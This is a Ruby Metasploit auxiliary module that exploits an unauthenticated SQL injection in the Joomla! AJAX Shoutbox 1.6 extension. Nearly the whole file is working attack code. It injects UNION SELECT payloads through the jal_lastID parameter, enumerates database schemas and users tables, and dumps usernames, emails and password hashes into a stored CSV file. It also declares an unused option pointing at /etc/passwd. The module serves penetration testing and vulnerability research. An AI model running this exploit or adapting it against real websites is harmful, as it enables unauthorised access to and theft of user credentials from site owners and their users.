##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##


require 'msf/core'


class MetasploitModule < Msf::Auxiliary

  include Msf::Exploit::Remote::HttpClient

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'Joomla! AJAX Shoutbox User/Password Hash Enumeration via Unauthenticated SQLi',
      'Description'    => %q{This module enumerates Joomla usernames and password hashes on vulnerable instances.

      This module will exploit an unauthenticated SQL injection in Joomla! AJAX Shoutbox 1.6
      for Joomla! version 2.5 in order to pull the usernames and password hashes from the database
      },
      'License'        => 'VolatileMinds',
      'Author'         =>
        [
          'Brandon Perry',
        ],
      'References'     =>
        [
          ['URL', 'http://www.exploit-db.com/exploits/32331']
        ],
      'DisclosureDate' => 'Mar 12 2014'
    ))

    register_options(
      [
        OptString.new('TARGETURI', [ true, "Base Joomla directory path", '/']),
        OptString.new('FILEPATH', [true, "The filepath to read on the server", "/etc/passwd"]),
      ], self.class)

  end

  def check
    front_marker = Rex::Text.rand_text_alpha(6)
    back_marker = Rex::Text.rand_text_alpha(6)
    chk = Rex::Text.rand_text_alpha(8)

    get_chk = " UNION ALL SELECT NULL,NULL,NULL,CONCAT(0x#{front_marker.unpack("H*")[0]},0x#{chk.unpack("H*")[0]},0x#{back_marker.unpack("H*")[0]}),NULL,NULL,NULL,NULL#"

    resp = send_injected_request(get_chk)

    if !resp or !resp.body
      return Exploit::CheckCode::Safe
    end

    v = $1 if resp.body =~ /#{front_marker}(.*)#{back_marker}/

    if !v
      return Exploit::CheckCode::Safe
    end

    return Exploit::CheckCode::Vulnerable
  end

  def run
    front_marker = Rex::Text.rand_text_alpha(6)
    back_marker = Rex::Text.rand_text_alpha(6)
    csv = ''
    get_dbs = " UNION ALL SELECT NULL,NULL,NULL,CONCAT(0x#{front_marker.unpack("H*")[0]},IFNULL(CAST(schema_name AS CHAR),0x20),0x#{back_marker.unpack("H*")[0]}),NULL,NULL,NULL,NULL FROM INFORMATION_SCHEMA.SCHEMATA#"

    res = send_injected_request(get_dbs)

    matches = res.body.scan(/#{front_marker}(.*?)#{back_marker}/)

    schemas = []
    matches.each do |match|
      schemas << match[0]
    end

    schemas.delete('mysql')
    schemas.delete('information_schema')
    schemas.delete('performance_schema')

    schemas.each do |schema|
      get_tables = " UNION ALL SELECT NULL,NULL,NULL,CONCAT(0x#{front_marker.unpack("H*")[0]},IFNULL(CAST(table_name AS CHAR),0x20),0x#{back_marker.unpack("H*")[0]}),NULL,NULL,NULL,NULL FROM INFORMATION_SCHEMA.TABLES WHERE table_schema IN (0x#{schema.unpack("H*")[0]})#"

      res = send_injected_request(get_tables)

      matches = res.body.scan(/#{front_marker}(.*?)#{back_marker}/)

      tables = []
      matches.each do |match|
        tables << match[0] if match[0] =~ /users$/
      end

      tables.each do |table|

        cols = ["id","name", "email", "block", "username", "usertype", "password", "sendEmail", "activation", "resetCount", "registerDate", "lastResetTime", "lastvisitDate"]
        get_table = " UNION ALL SELECT NULL,NULL,NULL,CONCAT(0x#{front_marker.unpack("H*")[0]}"
        regex = ""

        cols.each do |column|
          get_table << ",IFNULL(CAST(#{column} AS CHAR), 0x20), 0x#{front_marker.unpack("H*")[0]}"
          regex << "#{front_marker}(.*?)"
          csv << column + ","
        end
        csv << "\n"
        regex << front_marker

        get_table << "),NULL,NULL,NULL,NULL FROM #{schema}.#{table}#"

        res = send_injected_request(get_table)

        matches = res.body.scan(/#{regex}/)

        matches.each do |match|
          0.upto(cols.length-1) do |i|
            csv << match[i] + ","
          end
          csv << "\n"
        end
      end
    end

    file = csv
    path = store_loot("joomla.file", "text/plain", datastore['RHOST'], file)

    if path and path != ''
      print_good("File saved to: #{path}")
    end
  end

  def send_injected_request(str)
    return send_request_cgi({
      'uri' => normalize_uri(target_uri.path, '/'),
      'vars_get' => {
        'mode' => 'getshouts',
        'jal_lastID' => '-1 ' + str
      }
    })
  end
end

